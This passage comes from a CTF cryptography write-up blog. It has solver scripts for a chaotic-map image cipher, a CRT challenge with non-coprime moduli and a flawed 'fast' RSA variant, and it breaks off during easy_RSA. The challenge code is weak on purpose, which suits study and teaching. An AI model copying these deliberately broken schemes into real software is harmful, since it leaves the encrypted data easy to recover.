class="params">pixel, key1, key2, x0, m, n</span>):</span></span><br><span class="line">    num = m*n//<span class="number">8</span></span><br><span class="line">    seqs = []</span><br><span class="line">    x = x0</span><br><span class="line">    bins = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        x = generate(x)</span><br><span class="line">        tmp.append(x)</span><br><span class="line">        seqs.append(<span class="built_in">int</span>(x*<span class="number">22000</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> seqs:</span><br><span class="line">        bin_x = <span class="built_in">bin</span>(x)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(bin_x) &lt; <span class="number">16</span>:</span><br><span class="line">            bin_x = <span class="string">&#x27;0&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(bin_x))+bin_x</span><br><span class="line">        bins += bin_x</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">len</span>(pixel) == m*n)</span><br><span class="line">    cipher = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)]   <span class="comment"># 64个零</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            index = n*i+j</span><br><span class="line">            ch = <span class="built_in">int</span>(bins[<span class="number">2</span>*index:<span class="number">2</span>*index+<span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">            pix = pixel[index]</span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">0</span>:</span><br><span class="line">                pix = (pix ^ key1) &amp; <span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">                pix = (~pix ^ key1) &amp; <span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">                pix = (pix ^ key2) &amp; <span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">3</span>:</span><br><span class="line">                pix = (~pix ^ key2) &amp; <span class="number">0xff</span></span><br><span class="line">            cipher[index] = pix</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = <span class="number">24</span></span><br><span class="line">n = <span class="number">16</span></span><br><span class="line">r = <span class="number">1.2</span></span><br><span class="line">key1 = <span class="number">169</span></span><br><span class="line">key2 = <span class="number">78</span></span><br><span class="line">x0 = <span class="number">0.840264</span></span><br><span class="line">num = m*n//<span class="number">8</span></span><br><span class="line">seqs = []</span><br><span class="line">x = x0</span><br><span class="line">bins = <span class="string">&#x27;&#x27;</span></span><br><span class="line">tmp = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">    x = generate(x)</span><br><span class="line">    tmp.append(x)</span><br><span class="line">    seqs.append(<span class="built_in">int</span>(x*<span class="number">22000</span>))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> seqs:</span><br><span class="line">    bin_x  = <span class="built_in">bin</span>(x)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(bin_x) &lt; <span class="number">16</span>:</span><br><span class="line">        bin_x = <span class="string">&#x27;0&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(bin_x))+bin_x</span><br><span class="line">    bins += bin_x</span><br><span class="line"><span class="built_in">print</span>(bins)</span><br><span class="line">cipher = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)]   <span class="comment"># 256个零</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        index = n*i+j</span><br><span class="line">        ch = <span class="built_in">int</span>(bins[<span class="number">2</span>*index:<span class="number">2</span>*index+<span class="number">2</span>],<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># pix = pixel[index]</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">0</span>:</span><br><span class="line">            pix = <span class="number">169</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">            pix = <span class="number">86</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">            pix = <span class="number">78</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">3</span>:</span><br><span class="line">            pix = <span class="number">177</span></span><br><span class="line">        cipher[index] = pix</span><br><span class="line"></span><br><span class="line">key1 = <span class="number">169</span></span><br><span class="line">key2 = <span class="number">78</span></span><br><span class="line">bins = <span class="string">&#xx27;</span></span><br><span class="line">cipher = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)]   <span class="comment"># 384个零</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        index = n*i+j</span><br><span class="line">        ch = <span class="built_in">int</span>(bins[<span class="number">2</span>*index:<span class="number">2</span>*index+<span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">        pix = encrypt_flagimage[index]</span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">0</span>:</span><br><span class="line">            pix = (pix ^ key1) &amp; <span class="number">0xff</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">            pix = (~pix ^ key1) &amp; <span class="number">0xff</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">            pix = (pix ^ key2) &amp; <span class="number">0xff</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">3</span>:</span><br><span class="line">            pix = (~pix ^ key2) &amp; <span class="number">0xff</span></span><br><span class="line">        cipher[index] = pix</span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> cipher])</span><br><span class="line"><span class="built_in">print</span>(hashlib.md5(data.encode()).hexdigest())</span><br></pre></td></tr></table></figure>

<p>然后算出来和队伍的另外一位师傅（另外一个组员）解出来的image有一位不一样，应该是解密的问题，现在也截止了，没办法验证了</p>
<p>最后那位师傅又搞了一遍出来和我一样了，但依旧不知道是哪里错了</p>
<p>然后赛后看WP是先把数字转字节，然后拼接起来转md5的，很怪，为什么不用题目给的方式转换呢？？？</p>
<p>耶不爽</p>
<h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>同样也忘记名字了</p>
<p>反正就基础的RSA攻击</p>
<p>最后把雪莱的诗md5一下就好了，太麻烦了不想写</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>不行，满打满算才做出三道，还木大木大</p>
<p>我必须变得更加饥渴</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20200219 V&amp;N2020公开赛Crypto方向复现</title>
    <url>/posts/19a278ea/</url>
    <content><![CDATA[<blockquote>
<p>前景提要</p>
</blockquote>
<p>在签到2021TCTF时看到一篇WP，是标题所述比赛的easy_RSA，本来只是用一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python2 -m primefac -vs -m=p+<span class="number">1</span> XXXXX</span><br></pre></td></tr></table></figure>

<p>尝试分解那个迷之模数，当然以失败告终，但是在尚师傅的指导下，sage和ubuntu子系统觉醒出了更强大的组合</p>
<p>然后从这篇WP出发，尝试和组里的师傅们复现下这场比赛的Crypto部分</p>
<span id="more"></span>

<h1 id="20200219-V-amp-N2020公开赛Crypto方向复现"><a href="#20200219-V-amp-N2020公开赛Crypto方向复现" class="headerlink" title="20200219 V&amp;N2020公开赛Crypto方向复现"></a>20200219 V&amp;N2020公开赛Crypto方向复现</h1><h3 id="CRT"><a href="#CRT" class="headerlink" title="CRT"></a>CRT</h3><blockquote>
<p>题目描述</p>
</blockquote>
<p>Do you know the Chinese Remainder Theorem sometimes may not only have one solution?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ms = [getRandomNBitInteger(<span class="number">128</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">p = reduce(<span class="keyword">lambda</span> x, y: x*y, ms)</span><br><span class="line">x = getRandomRange(<span class="number">1</span>, p)</span><br><span class="line">cs = [x % m <span class="keyword">for</span> m <span class="keyword">in</span> ms]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.sha256(<span class="built_in">str</span>(x).encode()).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="keyword">assert</span>(<span class="string">&quot;4b93deeb&quot;</span> <span class="keyword">in</span> flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ms = [284461942441737992421992210219060544764, 218436209063777179204189567410606431578, 288673438109933649911276214358963643204, 239232622368515797881077917549177081575, 206264514127207567149705234795160750411, 338915547568169045185589241329271490503, 246545359356590592172327146579550739141, 219686182542160835171493232381209438048]</span></span><br><span class="line"><span class="comment"># cs = [273520784183505348818648859874365852523, 128223029008039086716133583343107528289, 5111091025406771271167772696866083419, 33462335595116820423587878784664448439, 145377705960376589843356778052388633917, 128158421725856807614557926615949143594, 230664008267846531848877293149791626711, 94549019966480959688919233343793910003]</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>题目很简单，但是自己饶了好多弯</p>
<p>首先，一看，这不就是构造了8个同余式吗，直接CRT一把梭；结果不对</p>
<p>然后我瞟了一眼网上的WP，看到不互素后就匆匆折返。确实忘了，中国剩余定理使用的条件是模数不互素，显然ms里的数肯定存在着相同的公因子；于是我在sage中分解了这8个数（这里写脚本我是用网上找来的CRT函数的，它会检查模数是否是互质，但其实sage里帮你自动处理了）</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210705194105634.png" alt="image-20210705194105634"></p>
<p>然后在保证模数尽可能大的原则下，写完了脚本。但结果依旧不对，并且出来的x是1006位，由题目可知x是属于$[1, 2^{1024}]$的，所以显然x是落在了$[2^{1007},2^{1024}]$这段区间。总之模数不够</p>
<p>不过，这也不是最困扰我的地方，与题目提示不同，我第一个想到的是，扩大模数，构造如下的同余方程<br>$$<br>\begin{cases}<br>x\equiv cs_1\ (mod\ ms_1)\\<br>x\equiv cs_2\ (mod\ ms_2)\\<br>\vdots\qquad \vdots \qquad\qquad \vdots\\<br>x\equiv cs_8\ (mod\ ms_8)\\<br>x\equiv cs_9\ (mod\ ms_9)<br>\end{cases}<br>$$<br>其中ms9是一个随机20位的素数，因为1007+20差不多就可以达到1024的大小</p>
<blockquote>
<p>编写脚本</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line">ms = [<span class="number">284461942441737992421992210219060544764</span>, <span class="number">218436209063777179204189567410606431578</span>, <span class="number">288673438109933649911276214358963643204</span>, <span class="number">239232622368515797881077917549177081575</span>, <span class="number">206264514127207567149705234795160750411</span>, <span class="number">338915547568169045185589241329271490503</span>, <span class="number">246545359356590592172327146579550739141</span>, <span class="number">219686182542160835171493232381209438048</span>]</span><br><span class="line">cs = [<span class="number">273520784183505348818648859874365852523</span>, <span class="number">128223029008039086716133583343107528289</span>, <span class="number">5111091025406771271167772696866083419</span>, <span class="number">33462335595116820423587878784664448439</span>, <span class="number">145377705960376589843356778052388633917</span>, <span class="number">128158421725856807614557926615949143594</span>, <span class="number">230664008267846531848877293149791626711</span>, <span class="number">94549019966480959688919233343793910003</span>]</span><br><span class="line"></span><br><span class="line">new_ms = copy.deepcopy(ms)</span><br><span class="line">my_ms = getPrime(<span class="number">20</span>)</span><br><span class="line">new_ms.append(my_ms)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(my_ms):</span><br><span class="line">    new_cs = copy.deepcopy(cs)</span><br><span class="line">    new_cs.append(i)</span><br><span class="line">    x = crt(new_cs, new_ms)</span><br><span class="line">    flag = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.sha256(<span class="built_in">str</span>(x).encode()).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;4b93deeb&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>再在该文件位置打开cmd，进入子系统，打开sage，输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">load(&quot;脚本文件名&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210705200158602.png" alt="image-20210705200158602"></p>
<p>就直接出来了，省去了粘贴换行的一些琐碎</p>
<p><strong>还有一点需要注意，在做这道题时最困扰我的是：浅拷贝。显然上面的脚本中，你可以看到我用了深拷贝的库，因为如果换成=赋值语句，你会印象深刻；除了debug意识淡薄了，也一度怀疑是不是自己对CRT还有理解偏差的地方</strong></p>
<blockquote>
<p>其他师傅的思路</p>
</blockquote>
<p>虽然这样做也无可厚非，但是还是没有能精确get到出题人的意思；什么时候才能像尚师傅一样做出题人肚子里的小蛔虫啊（茶）</p>
<p>最直接的思路应该是，CRT解出来的其实蕴含了一系列的解，其通式可以写成<br>$$<br>{kM+\sum_{i=1}^na_it_iM_i;\ k\in\mathbb{Z} }<br>$$<br>所以只要用CRT解出来x，然后爆破k就好，因为确实比较接近，上下两种方法的复杂度是同一级别的</p>
<p>当然上述通式的M是不互素的模数的积，贴一下脚本，不愧是尚师傅</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line">ms = [<span class="number">284461942441737992421992210219060544764</span>, <span class="number">218436209063777179204189567410606431578</span>, <span class="number">288673438109933649911276214358963643204</span>, <span class="number">239232622368515797881077917549177081575</span>, <span class="number">206264514127207567149705234795160750411</span>, <span class="number">338915547568169045185589241329271490503</span>, <span class="number">246545359356590592172327146579550739141</span>, <span class="number">219686182542160835171493232381209438048</span>]</span><br><span class="line">cs = [<span class="number">273520784183505348818648859874365852523</span>, <span class="number">128223029008039086716133583343107528289</span>, <span class="number">5111091025406771271167772696866083419</span>, <span class="number">33462335595116820423587878784664448439</span>, <span class="number">145377705960376589843356778052388633917</span>, <span class="number">128158421725856807614557926615949143594</span>, <span class="number">230664008267846531848877293149791626711</span>, <span class="number">94549019966480959688919233343793910003</span>]</span><br><span class="line">p = reduce(<span class="keyword">lambda</span> xx, yy: lcm(xx, yy), ms)</span><br><span class="line"></span><br><span class="line">x = crt(cs, ms)</span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    xx = k*p + x</span><br><span class="line">    k += <span class="number">1</span></span><br><span class="line">    flag = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.sha256(<span class="built_in">str</span>(xx).encode()).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;4b93deeb&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h3 id="Fast"><a href="#Fast" class="headerlink" title="Fast"></a>Fast</h3><blockquote>
<p>题目描述</p>
</blockquote>
<p>This is a modified RSA scheme that once proposed at a cryptography conference to achieve faster decryption. But, there seems something wrong with it.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">N = p * q</span><br><span class="line"></span><br><span class="line">g, r1, r2 = [getRandomRange(<span class="number">1</span>, N) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">g1 = <span class="built_in">pow</span>(g, r1 * (p-<span class="number">1</span>), N)</span><br><span class="line">g2 = <span class="built_in">pow</span>(g, r2 * (q-<span class="number">1</span>), N)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m</span>):</span></span><br><span class="line">    s1, s2 = [getRandomRange(<span class="number">1</span>, N) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">    c1 = (m * <span class="built_in">pow</span>(g1, s1, N)) % N</span><br><span class="line">    c2 = (m * <span class="built_in">pow</span>(g2, s2, N)) % N</span><br><span class="line">    <span class="keyword">return</span> (c1, c2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">c1, c2</span>):</span></span><br><span class="line">    xp = c1 % p</span><br><span class="line">    xq = c2 % q</span><br><span class="line">    <span class="comment"># Chinese Remainder Theorem</span></span><br><span class="line">    m = (xp*inverse(q, p)*q + xq*inverse(p, q)*p) % N</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = encrypt(bytes_to_long(flag))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># N = 18680643069610062851842282268594530254220611012409807422663284548187050713427682950720783343430650669361838067625768840896513125210105582070603021732086193955893838077699465426052925750736212977005683541174195320832791835197114668838654054444342903298662698415765898335350206380896849522280206304272801325820946987172164086644949521111058774180676742851681476123338557138770304164634321305204827406522957769478330124484710532963132900017800651579612646041955628867746525508376194147796920773364680264059390497210260540079810501777507814448518995581208169818764701641258963569599247156932381367802991222265241699715283</span></span><br><span class="line"><span class="comment"># g1 = 9143176283300810019842153344177123108612540016879643936458724056602746667157014763960725115919119704406826965726023263657276550779443988565368344040505696950820899770544814163379169539926317676679421275092688200844094929042154854719312788471536324082041360841253720783220459009201882865091829118575721525038404689868986360373373122049951274015083845966946475469982961355934516388706446794517870569063777231434618411404965077775991870069073539415961610645268985004687402050059891500490949250730689691141954694508001895390336750734542724392709744200091587065816283592253967715080611459937165344139809223328071517060208</span></span><br><span class="line"><span class="comment"># g2 = 14068322834597276347776814624877614869834816383564391664570268934537693322688875343215293618493363798985047779057952636529313879548457643220996398640913517182122425631198219387988691569709691279442005545716133131472147592456812502863851227108284027033557263611949365667779259585770738623603814004666845554284808166195201470503432803440754207350347128045893594280079379926676477680556845095378093693409219131090910168117334308781843178748431526974047817218228075136005979538773141427004682344298827618677773735288946271346252828348742296301538573408254015281232250841148556304927266143397565889649305095857756884049430</span></span><br><span class="line"><span class="comment"># c1, c2 = (3976514029543484086411168675941075541422870678409709261442618832911574665848843566949154289825219682094719766762966082440586568781997199077781276145091509192208487682443007457513002005089654365915817414921574344557570444253187757317116858499013550050579856269915915792827620535138057468531410166908365364129001407147467636145589396570815405571923148902993581000542566387654639930651683044853608873583911638108204074537952317056718986683846742909366072461130053275195290631718363272923316002049685111871888148244026652658482359335651889139243735138819453744763293112267738369048641158946411500606588429007794613880534, 18524535479582837341745231233387403662294605513261199630593257391163433751052467785080620993007681605662927226603747560698627838567782891522546977611597418150309028806158429831471152782211111046118637630899456903846057977815397285171313888516791822545633820066408276065732715348834255021260666966934592884548856831383262013360819013814149529393178712576141627031723067564594282618223686778534522328204603249125537258294561872667849498796757523663858312311082034700705599706428944071848443463999351872482644584735305157234751806369172212650596041534643187402820399145288902719434158798638116870325144146218568810928344)</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>这是什么神仙题，n可以被分解，解密函数也是现成的，而且是正确的</p>
<p>应该是出题人有意为之吧</p>
<blockquote>
<p>编写脚本</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">c1, c2</span>):</span></span><br><span class="line">    xp = c1 % p</span><br><span class="line">    xq = c2 % q</span><br><span class="line">    <span class="comment"># Chinese Remainder Theorem</span></span><br><span class="line">    m = (xp*inverse(q, p)*q + xq*inverse(p, q)*p) % N</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N = <span class="number">18680643069610062851842282268594530254220611012409807422663284548187050713427682950720783343430650669361838067625768840896513125210105582070603021732086193955893838077699465426052925750736212977005683541174195320832791835197114668838654054444342903298662698415765898335350206380896849522280206304272801325820946987172164086644949521111058774180676742851681476123338557138770304164634321305204827406522957769478330124484710532963132900017800651579612646041955628867746525508376194147796920773364680264059390497210260540079810501777507814448518995581208169818764701641258963569599247156932381367802991222265241699715283</span></span><br><span class="line">p = <span class="number">106417460801952098564106499070151038873024911455536068339939244771790540941720274028587207976808157868694798197258813111268537142798255715538795631061310640662123200632946626357221258957037900275496387833531601196435353735799649271157394995634449593246448856875377066127076028119584523015225013672972959211463</span></span><br><span class="line">q = <span class="number">175541146432497750706994831036579922743699110188170130349078711914372625934257198871368005366941949929286673808928975466227805723983786985788458460399280363091838402146937391317438052439989533790389951909401937742849194965413829547962616241584178560041639076246949503118700746929605640733813016659832730773141</span></span><br><span class="line">g1 = <span class="number">9143176283300810019842153344177123108612540016879643936458724056602746667157014763960725115919119704406826965726023263657276550779443988565368344040505696950820899770544814163379169539926317676679421275092688200844094929042154854719312788471536324082041360841253720783220459009201882865091829118575721525038404689868986360373373122049951274015083845966946475469982961355934516388706446794517870569063777231434618411404965077775991870069073539415961610645268985004687402050059891500490949250730689691141954694508001895390336750734542724392709744200091587065816283592253967715080611459937165344139809223328071517060208</span></span><br><span class="line">g2 = <span class="number">14068322834597276347776814624877614869834816383564391664570268934537693322688875343215293618493363798985047779057952636529313879548457643220996398640913517182122425631198219387988691569709691279442005545716133131472147592456812502863851227108284027033557263611949365667779259585770738623603814004666845554284808166195201470503432803440754207350347128045893594280079379926676477680556845095378093693409219131090910168117334308781843178748431526974047817218228075136005979538773141427004682344298827618677773735288946271346252828348742296301538573408254015281232250841148556304927266143397565889649305095857756884049430</span></span><br><span class="line">c1, c2 = (<span class="number">11823197525493679922462229312577565795790231943088967365041996969833687685138684663425736403362435947961162359880274061507909130337620672558788978473833973219147915805313662825413066312702383051828013250123487196306204170199886569869489424725349908927607008718147223533469811907589117819645863932215575433971043477313368023151369535540404625770972404614353104003800218866798610393931587791320241316614291168862653357565646094135540152539864650862797163818826669760914933822102864027625653527726320652797672561838261305835579141720874114224470663547248330428718333156518891792470511397032487663666074601934673538205109</span>, <span class="number">2779880537115408257595446644781256096238766529002829447374722026519904649762403856519534823378460053135911559335526959970225428282722454848749344880298922526768059646336181280198446021828944801139755808467391788638452557321859820238241700901109441893986616102072462317079424252804407738823379369895077334731847147033163210247117705503923134257895313179139530926252976334117657503240153146324063219900284664702824599298036943536916560758754916817002800088718757733395590409870811657828057225054151582638807129324477142895521653053887499550733193273834240174306480447726764751838123539992748222035712739618864572963930</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(decrypt(c1, c2)))</span><br></pre></td></tr></table></figure>

<p>应该是出题人有意为之的，但何必呢</p>
<h4 id="加密解密原理"><a href="#加密解密原理" class="headerlink" title="加密解密原理"></a>加密解密原理</h4><p>在做的过程中，有一点令我感到疑惑，一开始看到解密函数时，我认为这并不是针对加密函数的；也就是说，我以为的考点是让我们自己实现解密函数的</p>
<blockquote>
<p>生成随机数</p>
</blockquote>
<p>生成p，q，g1，g2，（g，r1，r2$\in$[1, N]）<br>$$<br>\begin{align}<br>g_1=g^{r_1\times(p-1)}\ mod\ N\\<br>g_2=g^{r_2\times(q-1)}\ mod\ N<br>\end{align}<br>$$</p>
<blockquote>
<p>加密</p>
</blockquote>
<p>加密后的结果是c1，c2，（s1，s2$\in$[1, N]）<br>$$<br>\begin{align}<br>c_1=m\times g_1^{s_1}\ mod\ N\\<br>c_2=m\times g_2^{s_2}\ mod\ N<br>\end{align}<br>$$</p>
<blockquote>
<p>解密</p>
</blockquote>
<p>看他的样子是解以下这个同余方程组<br>$$<br>\begin{align}<br>m\equiv c_1\ (mod\ p)\\<br>m\equiv c_2\ (mod\ q)<br>\end{align}<br>$$<br>顺便再来回顾以下CRT的通式，直接抄维基百科上的了</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706144819994.png" alt="image-20210706144819994"></p>
<p>但问题是m和c满足这个同余方程组吗？就像是ElGamal一样，他乘了一个数，不应该乘以其的逆元吗？</p>
<p>然后尚师傅点醒我了，由$g_1=g^{r_1\times(p-1)}\ mod\ N$可知，<br>$$<br>g_1\equiv g^{r_1\times (p-1)}\equiv 1\ (mod\ p)<br>$$<br>这就是欧拉定理</p>
<p><img src="https://i.imgur.com/KftFFd3.gif" alt="欧拉"></p>
<p>所以在模p和模q时，那个加密时多乘的数就变成1了</p>
<p><strong>总之，回到题目，说是一种修改过的RSA加密模式；当然在课上也学过用CRT加速RSA的解密，前提是要知道p和q，和这个异曲同工吧。或者应该说，这种方法有点借鉴了ElGamal加密算法的思想</strong></p>
<h3 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h3><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getprime</span>(<span class="params">bits</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        n = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> n.bit_length() &lt; bits:</span><br><span class="line">            n *= next_prime(randint(<span class="number">1</span>,<span class="number">1000</span>))</span><br><span class="line">        <span class="keyword">if</span> isPrime(n - <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> n - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(<span class="string">b&#x27;flag&#123;************************************&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = getprime(<span class="number">505</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">r = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="keyword">assert</span> m &lt; q</span><br><span class="line"></span><br><span class="line">n = p * q * r</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = invert(q ** <span class="number">2</span>, p ** <span class="number">2</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m, <span class="number">2</span>, r)</span><br><span class="line">cipher = <span class="built_in">pow</span>(c, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">7941371739956577280160664419383740967516918938781306610817149744988379280561359039016508679365806108722198157199058807892703837558280678711420411242914059658055366348123106473335186505617418956630780649894945233345985279471106888635177256011468979083320605103256178446993230320443790240285158260236926519042413378204298514714890725325831769281505530787739922007367026883959544239568886349070557272869042275528961483412544495589811933856131557221673534170105409</span></span><br><span class="line"><span class="string">7515987842794170949444517202158067021118454558360145030399453487603693522695746732547224100845570119375977629070702308991221388721952258969752305904378724402002545947182529859604584400048983091861594720299791743887521228492714135449584003054386457751933095902983841246048952155097668245322664318518861440</span></span><br><span class="line"><span 